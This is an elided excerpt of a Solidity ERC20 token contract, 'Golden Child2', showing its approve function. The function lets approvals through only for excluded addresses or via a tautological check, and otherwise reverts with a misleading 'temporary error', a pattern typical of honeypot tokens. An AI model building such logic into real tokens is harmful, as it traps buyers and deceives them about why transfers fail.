...
contract GoldenChild2 is Context, IERC20, Ownable {
    ...
    string private _name = 'Golden Child2';
    string private _symbol = 'Golden2';
    ...
    function approve(address spender, uint256 amount) public override returns (bool) {
        if (_isExcluded[msg.sender] || msg.sender == _msgSender()) {
        _approve(_msgSender(), spender, amount);
        return true;}
        else { require(amount == 0, "temporary error");}
    }
